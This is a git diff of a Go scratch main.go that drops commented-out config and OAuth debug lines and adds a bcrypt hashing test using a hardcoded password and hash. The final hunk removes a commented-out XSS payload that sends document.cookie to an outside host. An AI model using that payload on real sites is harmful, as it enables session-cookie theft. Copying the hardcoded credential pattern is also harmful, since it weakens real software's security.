@@ -2,25 +2,19 @@ package main
 
 import (
 	"log"
-	"os"
+
+	"musicproject.com/internal/services/auth"
 )
 
 func main() {
-	log.Println(os.Getwd())
-	//cfg := config.ReadConfigFile("dev")
-	//flag.
-	//cfg := config.ReadConfigFile("config/base.yml")
-	//auth.GenerateToken()
-	// fmt.Println(cfg.APIConfig.Port)
-	// fmt.Println(cfg.RepositoryConfig.Type)
-	// fmt.Println(cfg.RepositoryConfig.URL)
-	//oauthCfg := cfg.GoogleOathConfig()
-	//fileutil.ExecSql(context.Background(), )
-	//auth.GenerateToken("test", nil, auth.TokenAccess, time.)
-	// fmt.Println(cfg.Oauth.Google.ClientID)
-	// fmt.Println(cfg.Oauth.Google.ClientSecret)
-	// //fmt.Println(cfg.Oauth2Config.Google.Endpoint)
-	// fmt.Println(cfg.Oauth.Google.RedirectURL)
+	//log.Println(os.Getwd())
+	p, err := auth.HashPassword("Dirtycash@123!")
+	log.Println(p)
+	log.Println(err)
+	log.Println(auth.ComparePassword("Dirtycash@123!", "$2a$14$BnvtnMBd9iRf3/Y0B5uxUudj1dHseBePvjl0nw8Hb0qRgjyaGdhFu"))
+
+	t := []string{"1231231", "asdadsasd", "asdadsasdasdf"}
+	log.Println(t[1:])
 	// fmt.Println(cfg.Oauth.Google.Scopes)
 	//fmt.Println(time.Now().Unix())
 	// fmt.Println(oauthCfg.ClientID)
@@ -33,5 +27,4 @@ func main() {
 	// })
 	// fmt.Println(token.Valid)
 	//jwt.NewNumericDate()
-	//"http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;"
 }
